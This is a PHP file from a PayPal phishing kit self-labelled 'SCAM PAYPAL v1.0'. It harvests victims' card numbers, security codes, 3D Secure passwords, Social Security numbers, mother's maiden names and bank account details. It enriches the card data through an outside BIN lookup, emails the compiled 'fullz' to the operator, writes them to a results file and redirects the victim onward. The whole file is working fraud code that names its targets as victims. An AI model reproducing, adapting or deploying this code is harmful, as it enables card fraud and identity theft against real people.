<?php
/*   
        ───────────────────────────────────────────────────────────────────────────────────
        ───────────────────██████──────────██████─████████████████─────────────────────────
        ───────────────────██░░██████████████░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░░░░░░░░░░░░░░░░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██████░░██████░░██─██░░██────██░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░██──██████──██░░██─██░░██████░░████─────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██───────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██████─██████────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░░░░░██─██░░██────────────────
        ───────────────────██████──────────██████─██████──██████████─██████────────────────
        ───────────────────────────────────────────────────────────────────────────────────
        ────────────────────────────────────────────────────────────────────────────────────
        ─██████████████─██████─────────██████████████─██████████████─██████──────────██████─
        ─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─
        ─██░░██████████─██░░██─────────██░░██████████─██░░██████░░██─██░░░░░░░░░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██████░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██──██░░██████░░██─
        ─██░░██████████─██░░██████████─██░░██████████─██░░██──██░░██─██░░██──██░░░░░░░░░░██─
        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░██──██████████░░██─
        ─██████████████─██████████████─██████████████─██████──██████─██████──────────██████─
        ───────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM PAYPAL v1.0    #
                                        #    Mr.CLEAN.PAYPAL    #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/

        session_start();
        error_reporting(0);
        $TIME_DATE = date('H:i:s d/m/Y');
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_browser.php');
	include('../functions/get_ip.php'); 
        include('../config.php');
        ########################################################
        ############### [+] VBV INFORMATION [+] ################
        ########################################################
        if(!empty($_POST['password_vbv'])){$_SESSION['_password_vbv_'] = $_POST['password_vbv'];}
        if(!empty($_POST['day']) && !empty($_POST['month']) && !empty($_POST['year'])){$_SESSION['_dob_'] = $_POST['day']."/".$_POST['month']."/".$_POST['year'];}
        if(!empty($_POST['sortnum1']) && !empty($_POST['sortnum2']) && !empty($_POST['sortnum3'])){$_SESSION['_sortnum_'] = $_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];}
        if(!empty($_POST['accnumber'])){$_SESSION['_accnumber_'] = $_POST['accnumber'];}
        if(!empty($_POST['ssn1']) && !empty($_POST['ssn2']) && !empty($_POST['ssn3'])){$_SESSION['_ssnnum_'] = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];}
        if(!empty($_POST['mmname'])){$_SESSION['_mmname_'] = $_POST['mmname'];}
        if(!empty($_POST['creditlimit'])){$_SESSION['_creditlimit_'] = $_POST['creditlimit'];}
        if(!empty($_POST['osid'])){$_SESSION['_osid_'] = $_POST['osid'];}
        if(!empty($_POST['codicefiscale'])){$_SESSION['_codicefiscale_'] = $_POST['codicefiscale'];}
        if(!empty($_POST['kontonummer'])){$_SESSION['_kontonummer_'] = $_POST['kontonummer'];}
        if(!empty($_POST['offid'])){$_SESSION['_offid_'] = $_POST['offid'];}
        ########################################################
        ####### [+] GET CREDITCARD BIN INFORMATIONS [+] ########
        ########################################################
        $_SESSION['_cc_holder_'] = strtoupper($_SESSION['_cc_holder_']);
        if(isset($_SESSION['_cc_number_']) && !empty($_SESSION['_cc_number_'])){
        $_SESSION['_cc_number_'] = preg_replace('/\s+/', '', $_SESSION['_cc_number_']);
        $BIN_LOOKUP = substr($_SESSION['_cc_number_'], 0, 6);
        $SYPHER_BIN    = @json_decode(file_get_contents("https://bincodes.ga/GET_BIN.php?cc=$BIN_LOOKUP"));
        $BIN_SCHEME    = $SYPHER_BIN->SCHEME;
        $BIN_TYPE      = $SYPHER_BIN->TYPE;
        $BIN_BRAND     = $SYPHER_BIN->BRAND;
        $BIN_CNAME     = $SYPHER_BIN->COUNTRY;
        $BIN_CCODE     = $SYPHER_BIN->ALPHA;
        $BIN_BNAME     = $SYPHER_BIN->BANK;
        $BIN_BURL      = $SYPHER_BIN->URL;
        $BIN_BPHONE    = $SYPHER_BIN->PHONE;
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
        $_SESSION['_country_']  = $BIN_CNAME;
        $_SESSION['_cc_brand_'] = $BIN_SCHEME;
        $_SESSION['_cc_bank_']  = $BIN_BNAME;
        $_SESSION['_cc_type_']  = $BIN_TYPE;
        $_SESSION['_cc_class_'] = $BIN_BRAND;
        $_SESSION['_cc_site_']  = $BIN_BURL;
        $_SESSION['_cc_phone_'] = $BIN_BPHONE;
        $_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];}
	$VISACARD   = $_SESSION['_cc_brand_'] == "VISA" || $_SESSION['_cc_brand_'] == "VISA ELECTRON";
	$MASTERCARD = $_SESSION['_cc_brand_'] == "MASTERCARD" || $_SESSION['_cc_brand_'] ==  "MAESTRO";
	if($MASTERCARD) {
	$Type_XXX = "MasterCard SecureCode";
	}elseif($VISACARD) {
	$Type_XXX = "Verified by Visa";}
        ########################################################
        ################ [+] SYPHER_MESSAGE [+] ################
        ########################################################
	$SYPHER_MESSAGE  = "<html><body>";
        $SYPHER_MESSAGE .= "
        <br>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> CARDING INFORMATION </font> [+]</font> ###########################<br>
		<font style='color:#9c0000;'>[+]</font> DEAR, <font color='#9c0000'>".$SYPHER_NAME."</font> THIS IS YOUR VBV RESULT ENJOY ! <br>
        <font style='color:#9c0000;'>[+]</font> [Bank Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_bank_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_holder_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [".$BIN_SCHEME." Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cc_number_']." (".$_SESSION['_ccglobal_'].")</font><br>
        <font style='color:#9c0000;'>[+]</font> [Card Security Code]	= <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expirationDate_']."</font><br>
        ############################### <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VBV INFORMATION </font> [+]</font> #############################<br>
        <font style='color:#9c0000;'>[+]</font> [Date of Birth]  = <font style='color:#0070ba;'>".$_SESSION['_dob_']." (DD/MM/YYYY)</font><br>
        <font style='color:#9c0000;'>[+]</font> [3D Secure]      = <font style='color:#0070ba;'>".$_SESSION['_password_vbv_']."</font><br>";
        if ($_SESSION['_LOOKUP_CNTRCODE_'] == "US"){ // UNITED STATES
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [Social Security Number] = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>";}
        elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "CA"){ // CANADA
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [Social Security Number] = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>";
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [Mother's Maiden Name] = <font style='color:#0070ba;'>".$_SESSION['_mmname_']."</font><br>";}
        elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "IE" || $_SESSION['_LOOKUP_CNTRCODE_'] == "GB"){ // UNITED KINGDOM // IRELAND
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [Sort Code] = <font style='color:#0070ba;'>".$_SESSION['_sortnum_']."</font><br>";
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [Account Number] = <font style='color:#0070ba;'>".$_SESSION['_accnumber_']."</font><br>";}
        elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "AU"){ // AUSTRALIA
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [Credit Limits] = <font style='color:#0070ba;'>".$_SESSION['_creditlimit_']."</font><br>";
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [OSID]	= <font style='color:#0070ba;'>".$_SESSION['_osid_']."</font><br>";}
        elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "IT"){ // ITALY
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [Codice Fiscale] = <font style='color:#0070ba;'>".$_SESSION['_codicefiscale_']."</font><br>";}
        if($_SESSION['_LOOKUP_CNTRCODE_'] == "CH" || $_SESSION['_LOOKUP_CNTRCODE_'] == "DE") { // SWITZERLAND || GERMANY
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [Kontonummer] = <font style='color:#0070ba;'>".$_SESSION['_kontonummer_']."</font><br>";}
        elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "GR"){ // GREECE
        $SYPHER_MESSAGE .= "<font style='color:#9c0000;'>[+]</font> [Officiel ID] = <font style='color:#0070ba;'>".$_SESSION['_offid_']."</font><br>";}
        $SYPHER_MESSAGE .= "
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [Full Address line] = <font style='color:#0070ba;'>".$_SESSION['_billingAddress_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [Country Name] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_COUNTRY_']." & THE ".$BIN_SCHEME." CARD MADE IN ".$_SESSION['_country_']."</font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/".$_SESSION['_ip_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>".SYPHER_Browser($_SERVER['HTTP_USER_AGENT'])." On ".SYPHER_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> ########################<br>
        </div></body></html>";
        ################ [+] SYPHER_SUBJECT [+] ################
	$SYPHER_SUBJECT = "(PAYPAL)($Type_XXX)(".$_SESSION['_cc_bank_'].")(".$_SESSION['_forlogin_'].")";
        ################ [+] SYPHER_HEADERS [+] ################
        $SYPHER_HEADERS  = "From: Mr. CLEAN ☑ <no_reply@mrclean.ml>\n";
        $SYPHER_HEADERS .= "MIME-Version: 1.0\r\n";
        $SYPHER_HEADERS .= "Content-Type: text/html; charset=ISO-8859-1\n";
        ################## [+] SEND MAIL [+] ###################
        if(!empty($_POST['password_vbv'])){
        mail($SYPHER_EMAIL, $SYPHER_SUBJECT, $SYPHER_MESSAGE, $SYPHER_HEADERS);
	$MYFILE = "../../../all_result/FULLZ.php";
        ################## [+] TEXT RESULT [+] #################
	$FH = fopen($MYFILE, 'a+') or die("Can't open file.");
	fwrite($FH, $SYPHER_MESSAGE);
	fclose($FH);}
        ################## [+] NEXT PAGE [+] ###################
        HEADER("Location: ../identity/identity.php?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
?>